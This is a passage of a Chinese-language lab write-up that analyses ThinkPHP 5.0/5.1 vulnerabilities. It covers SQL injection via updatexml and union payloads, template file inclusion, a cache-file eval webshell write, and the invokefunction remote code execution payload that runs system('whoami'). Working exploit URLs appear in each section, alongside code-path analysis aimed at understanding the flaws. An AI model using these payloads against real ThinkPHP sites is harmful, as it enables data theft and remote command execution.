class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>])-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="comment">// $username = request()-&gt;get(&#x27;username&#x27;);</span></span><br><span class="line">        <span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where(&#x27;username&#x27;,&#x27;exp&#x27;,$username)-&gt;select();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h6><p>直接根据payload调试代码理解代码执行过程</p>
+<p>$username还是数组形式，直接分析result代码，代码执行过程就是db-&gt;where-&gt;select，前面两个和传入的参数关系不大，这里直接分析select函数，跳转到此处的sql之前我们传入的参数并没有被使用，这里的options包含了我们传入的参数的内容</p>
+<img src="/post/96d74354/image-20240304202814176.png" alt="image-20240304202814176" style="zoom: 25%;">
+
+<p>在select函数中主要是通过获取各参数值进行sql语句的生成，我们主要关注和payload有关的where</p>
+<img src="/post/96d74354/image-20240304203016264.png" alt="image-20240304203016264" style="zoom:25%;">
+
+<p>如下所示，先进入buildwhere函数</p>
+<img src="/post/96d74354/image-20240304203328509.png" alt="image-20240304203328509" style="zoom:25%;">
+
+<p>最后返回的wherestr和此处的str有关，继续查看相关函数</p>
+<img src="/post/96d74354/image-20240304203447389.png" alt="image-20240304203447389" style="zoom:33%;">
+
+<p>在此处将第一个和第二个参数分别赋值给了exp和value</p>
+<img src="/post/96d74354/image-20240304203531585.png" alt="image-20240304203531585" style="zoom:33%;">
+
+<p>后面会检查value是否为标量，如果是就会重新对value赋值，而我们此处的value是数组，还有后面对exp的过滤，发现少了not like</p>
+<img src="/post/96d74354/image-20240304203711608.png" alt="image-20240304203711608" style="zoom:25%;">
+
+<p>接着进行模糊匹配</p>
+<img src="/post/96d74354/image-20240304203820209.png" alt="image-20240304203820209" style="zoom:33%;">
+
+<p>生成以下内容</p>
+<img src="/post/96d74354/image-20240304204019513.png" alt="image-20240304204019513" style="zoom:25%;">
+
+<p>最后的wherestr如图所示</p>
+<img src="/post/96d74354/image-20240304204410583.png" alt="image-20240304204410583" style="zoom:25%;">
+
+<p>最后构造出的sql语句</p>
+<img src="/post/96d74354/image-20240304204538559.png" alt="image-20240304204538559" style="zoom: 50%;">
+
+<p>最终执行效果</p>
+<img src="/post/96d74354/image-20240304204944556.png" alt="image-20240304204944556" style="zoom:33%;">
+
+<h5 id="sql5"><a href="#sql5" class="headerlink" title="sql5"></a>sql5</h5><h6 id="环境-4"><a href="#环境-4" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.1.22下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.22 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.22&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码-4"><a href="#测试代码-4" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$orderby</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;mochazz&#x27;</span>])-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$orderby</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h6><p>在本项目中传入的是orderby参数，并且是通过数组赋值的方式进行传递的，通过get方法理解orderby参数获取</p>
+<img src="/post/96d74354/image-20240304211101722.png" alt="image-20240304211101722" style="zoom:33%;">
+
+<p>传递进的orderby如图所示</p>
+<img src="/post/96d74354/image-20240304211201542.png" alt="image-20240304211201542" style="zoom: 50%;">
+
+<p>通过getdata变成字符串数组</p>
+<img src="/post/96d74354/image-20240304211338857.png" alt="image-20240304211338857" style="zoom:33%;">
+
+<p>最后返回给orderby参数的值为</p>
+<img src="/post/96d74354/image-20240304211444960.png" alt="image-20240304211444960" style="zoom: 25%;">
+
+<p>现在进入下面sql执行过程，在order函数中将传入的orderby参数给了order</p>
+<img src="/post/96d74354/image-20240304211737867.png" alt="image-20240304211737867" style="zoom: 25%;">
+
+<p>然后将options传递给connection的find方法</p>
+<img src="/post/96d74354/image-20240304211843131.png" alt="image-20240304211843131" style="zoom: 50%;">
+
+<p>如下是根据payload生成的order参数</p>
+<img src="/post/96d74354/image-20240304212627585.png" alt="image-20240304212627585" style="zoom:25%;">
+
+<p>生成的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">WHERE</span>  `username` <span class="operator">=</span> :where_AND_username <span class="keyword">ORDER</span> <span class="keyword">BY</span> `id`<span class="operator">|</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)#` LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure>
+
+<p>最终效果</p>
+<img src="/post/96d74354/image-20240304212908802.png" alt="image-20240304212908802" style="zoom:33%;">
+
+<h5 id="sql6"><a href="#sql6" class="headerlink" title="sql6"></a>sql6</h5><h6 id="环境-5"><a href="#环境-5" class="headerlink" title="环境"></a>环境</h6><p>沿用上文环境</p>
+<h6 id="测试代码-5"><a href="#测试代码-5" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">max</span>(<span class="variable">$options</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1)%20from%20users%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h6><p>第一行代码还是一样，直接看获取到的options参数</p>
+<img src="/post/96d74354/image-20240304214040554.png" alt="image-20240304214040554" style="zoom:33%;">
+
+<p>进入max函数查看代码执行流程，max函数中只调用了aggregate方法，而aggregate方法中又调用了connection的aggregate方法</p>
+<img src="/post/96d74354/image-20240304214344276.png" alt="image-20240304214344276" style="zoom: 33%;">
+
+<p>在该函数中重新构造了field</p>
+<img src="/post/96d74354/image-20240304214510340.png" alt="image-20240304214510340" style="zoom:33%;">
+
+<p>接着进入value函数，value函数中的该部分会将field转换为字符串数组形式</p>
+<img src="/post/96d74354/image-20240304214751014.png" alt="image-20240304214751014" style="zoom:33%;">
+
+<p>接着设置query的参数</p>
+<img src="/post/96d74354/image-20240304215043886.png" alt="image-20240304215043886" style="zoom: 50%;">
+
+<p>最后的sql语句就是构造的field</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(`id`)<span class="operator">+</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">from</span> users#`) <span class="keyword">AS</span> tp_max <span class="keyword">FROM</span> `users` LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure>
+
+<p>效果如图所示</p>
+<img src="/post/96d74354/image-20240304215326838.png" alt="image-20240304215326838" style="zoom: 33%;">
+
+<h5 id="文件包含7"><a href="#文件包含7" class="headerlink" title="文件包含7"></a>文件包含7</h5><h6 id="环境-6"><a href="#环境-6" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.18下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.18&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码-6"><a href="#测试代码-6" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建 <strong>application&#x2F;index&#x2F;view&#x2F;index&#x2F;index.html</strong> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 <strong>1.jpg</strong> 放至 <strong>public</strong> 目录下（模拟上传图片操作）。接着访问<code>~/public/index.php?cacheFile=1.jpg</code> 链接，即可触发 <strong>文件包含漏洞</strong> 。</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?cacheFile=1.jpg</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h6><p>首先通过request()-&gt;get()获取get参数</p>
+<img src="/post/96d74354/image-20240305102443428.png" alt="image-20240305102443428" style="zoom:33%;">
+
+<p>接着调用input方法进行过滤或者类型转换，此处没有类型转换，最后返回的data就是传递进来的值</p>
+<img src="/post/96d74354/image-20240305102552087.png" alt="image-20240305102552087" style="zoom:33%;">
+
+<p>接着进入assign函数，在该函数中直接调用了view的assign函数</p>
+<img src="/post/96d74354/image-20240305102629136.png" alt="image-20240305102629136" style="zoom:50%;">
+
+<p>现在进入view的assign函数，这里直接将name给了this-&gt;data，没有过滤</p>
+<img src="/post/96d74354/image-20240305102704571.png" alt="image-20240305102704571" style="zoom:33%;">
+
+<p>最后回到主函数，由此，第一行代码的主要用处就是将get参数赋值给this-&gt;data，接着进入fetch函数，同样也是直接调用的view的fetch函数</p>
+<img src="/post/96d74354/image-20240305102840977.png" alt="image-20240305102840977" style="zoom:50%;">
+
+<p>首先将文件名赋值给var</p>
+<img src="/post/96d74354/image-20240305102926018.png" alt="image-20240305102926018" style="zoom:50%;">
+
+<p>在此处有对vars变量的利用</p>
+<img src="/post/96d74354/image-20240305103222701.png" alt="image-20240305103222701" style="zoom:50%;">
+
+<p>在该函数中首先进行模板文件调取，成功就进入下面的template的fetch函数</p>
+<img src="/post/96d74354/image-20240305103336582.png" alt="image-20240305103336582" style="zoom: 33%;">
+
+<p>在template的fetch函数中，将data值赋值给了this-&gt;data变量，下面主要关注对该变量的使用，如下所示，进入了read函数</p>
+<img src="/post/96d74354/image-20240305103540991.png" alt="image-20240305103540991" style="zoom: 33%;">
+
+<p>在此处调用了extract函数，经过调试测试发现在运行该函数之后cachefile的值就会变成vars的值，应该是extract会将缓存变量覆盖成vars变量的值，最终导致cacheFile的改变</p>
+<img src="/post/96d74354/image-20240305103622178.png" alt="image-20240305103622178" style="zoom:33%;">
+
+<p>效果呈现</p>
+<img src="/post/96d74354/image-20240305104145722.png" alt="image-20240305104145722" style="zoom:33%;">
+
+<h5 id="代码执行8"><a href="#代码执行8" class="headerlink" title="代码执行8"></a>代码执行8</h5><h6 id="环境-7"><a href="#环境-7" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.10下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="测试代码-7"><a href="#测试代码-7" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="title function_ invoke__">input</span>(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/<span class="keyword">public</span>/index.php?username=mochazz123%<span class="number">0</span>d%<span class="number">0</span>a@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[_]);<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h6><p>可以确定全部操作都是在第一行代码运行出的，首先进入input函数，经过调试在整个input函数中并没有对传入的get参数进行操作，只是将get.username拆分成了get和username，分别给了method和key，最后返回request的method</p>
+<img src="/post/96d74354/image-20240305105555449.png" alt="image-20240305105555449" style="zoom:33%;">
+
+<p>然后就会进入get函数，和前面一样，get函数将会获取get参数内容，并在最后调用input方法</p>
+<img src="/post/96d74354/image-20240305105719139.png" alt="image-20240305105719139" style="zoom:33%;">
+
+<p>在input函数中会对data进行强制类型转换，由于前面没有指定，因此转换的类型就是字符串形式，最后返回的data如下</p>
+<img src="/post/96d74354/image-20240305105858355.png" alt="image-20240305105858355" style="zoom:33%;">
+
+<p>接着进入set方法，看来主要就是下面的set方法</p>
+<img src="/post/96d74354/image-20240305105949275.png" alt="image-20240305105949275" style="zoom:33%;">
+
+<p>首先是init函数，对self进行初始化</p>
+<img src="/post/96d74354/image-20240305110102282.png" alt="image-20240305110102282" style="zoom:33%;">
+
+<p>然后是set函数，首先根据name获取要存入的文件的filename</p>
+<img src="/post/96d74354/image-20240305110240895.png" alt="image-20240305110240895" style="zoom:33%;">
+
+<p>如下是filename的具体生成过程</p>
+<img src="/post/96d74354/image-20240305110335703.png" alt="image-20240305110335703" style="zoom:33%;">
+
+<p>然后将value序列化给data，然后加上前后缀，就直接放入前面生成的filename所指定的文件，由于缺少内容过滤过程，因此很容易被写入恶意代码</p>
+<img src="/post/96d74354/image-20240305110435609.png" alt="image-20240305110435609" style="zoom:50%;">
+
+<p>最终实验效果如下，由于开启了火绒，文件会被自动删除<img src="/post/96d74354/image-20240305110634120.png" alt="image-20240305110634120" style="zoom:33%;"></p>
+<h5 id="代码执行9"><a href="#代码执行9" class="headerlink" title="代码执行9"></a>代码执行9</h5><h6 id="环境-8"><a href="#环境-8" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.1.30下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.30 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.30&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/<span class="keyword">public</span>/?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h6><p>首先明确 <code>index/\think\app/invokefunction</code> 是路径信息，pathinfo，指定了请求的处理逻辑，<code>call_user_func_array</code> 应该是请求的函数，vars是两个变量</p>
+<p>从此处的pathinfo函数进行分析，此处的var_pathinfo就是s，代表的是兼容参数，因此我们传入的第一个参数的值会被赋值给<code>$pathinfo</code></p>
+<img src="/post/96d74354/image-20240305164143503.png" alt="image-20240305164143503" style="zoom:33%;">
+
+<p>接着进入path函数，去除了正常的url后缀，最后返回的path还是 <code>index/\think\app/invokefunction</code> </p>
+<img src="/post/96d74354/image-20240305164350845.png" alt="image-20240305164350845" style="zoom: 25%;">
+
+<p>接着在routecheck函数中检查是否为强制路由模式</p>
+<img src="/post/96d74354/image-20240305164506065.png" alt="image-20240305164506065" style="zoom:33%;">
+
+<p>然后进入check方法，在此处又会对url进行检测，这里的url就是前面的path</p>
+<img src="/post/96d74354/image-20240305164637464.png" alt="image-20240305164637464" style="zoom:33%;">
+
+<p>在这个 <code>check</code> 方法中，首先会检测别名路由，然后检测 URL 绑定。如果检测到任何一个条件匹配成功，就会返回相应的结果。如果没有匹配到别名路由或者 URL 绑定，就会继续检测是否有设置了 <code>append</code> 或 <code>middleware</code> 选项，如果有的话，会进行相应的处理。在当前情况下以上条件都不满足，则会调用父类的 <code>check</code> 方法进行检测。</p>
+<img src="/post/96d74354/image-20240305165021043.png" alt="image-20240305165021043" style="zoom: 33%;">
+
+<p>最后返回的结果还是false，表示请求的URL不正确或者不在预期的范围内。</p>
+<img src="/post/96d74354/image-20240305165316403.png" alt="image-20240305165316403" style="zoom:25%;">
+
+<p>然后返回前面的check函数，在此处对must进行了判断，如果是强制路由就引发异常，在此处不是</p>
+<img src="/post/96d74354/image-20240305165424324.png" alt="image-20240305165424324" style="zoom:33%;">
+
+<p>然后进行url解析，此处的this-&gt;dispatch就是s的值</p>
+<img src="/post/96d74354/image-20240305165605584.png" alt="image-20240305165605584" style="zoom:25%;">
+
+<p>然后进入parseurlpath函数，返回的path和var的值如下所示</p>
+<img src="/post/96d74354/image-20240305165810171.png" alt="image-20240305165810171" style="zoom:25%;">
+
+<p>接着就是解析模块，在该模块中对控制器和运行函数都进行了解析</p>
+<img src="/post/96d74354/image-20240305170010343.png" alt="image-20240305170010343" style="zoom:33%;">
+
+<p>接着封装路由并返回</p>
+<img src="/post/96d74354/image-20240305170107768.png" alt="image-20240305170107768" style="zoom:33%;">
+
+<p>这个函数将会返回执行结果</p>
+<img src="/post/96d74354/image-20240305170449539.png" alt="image-20240305170449539" style="zoom:33%;">
+
+
+
+<p>最后在dispatch函数中调用了call_user_func，将后面传入的两个参数分别作为命令和参数，因为在request里面制定了模块，控制器，方法，还有参数</p>
+<img src="/post/96d74354/image-20240305170643834.png" alt="image-20240305170643834" style="zoom:33%;">
+
+
+
+<p>运行结果如图所示</p>
+<img src="/post/96d74354/image-20240305170902184.png" alt="image-20240305170902184" style="zoom:33%;">
+
+<h5 id="代码执行10"><a href="#代码执行10" class="headerlink" title="代码执行10"></a>代码执行10</h5><h6 id="环境-9"><a href="#环境-9" class="headerlink" title="环境"></a>环境</h6><p>thinkphp5.0.23下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.23 tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改composer.json文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.23&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下执行<code>composer update</code></p>
+<h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><img src="/post/96d74354/image-20240305214203124.png" alt="image-20240305214203124" style="zoom:33%;">
+
+<h6 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h6><p>该实验主要的漏洞点在于此处的method方法不对post的数据进行过滤，用户可以构造成自己想执行的this的方法，此处采取构造成construct方法</p>
+<img src="/post/96d74354/image-20240305213920337.png" alt="image-20240305213920337" style="zoom:33%;">
+
+<p>然后接着就会调用construct方法，而construct方法就是对变量进行覆盖</p>
+<img src="/post/96d74354/image-20240305214010427.png" alt="image-20240305214010427" style="zoom:33%;">
+
+<p>这里我们主要是利用filtervalue函数中call_user_func方法，因此覆盖的就是filter和value</p>
+<img src="/post/96d74354/image-20240305214102646.png" alt="image-20240305214102646" style="zoom:33%;">
+
+<p>实验效果</p>
+<img src="/post/96d74354/image-20240305214143722.png" alt="image-20240305214143722" style="zoom:33%;">
+
+</div><div class="article-licensing box"><div class="licensing-title"><p>Thinkphp5_x（不包含反序列化）</p><p><a href="http://example.com/post/96d74354.html">http://example.com/post/96d74354.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>yyyyyyxnp</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2024-03-03</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2024-09-29</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/php/">php</a></div><div class="notification 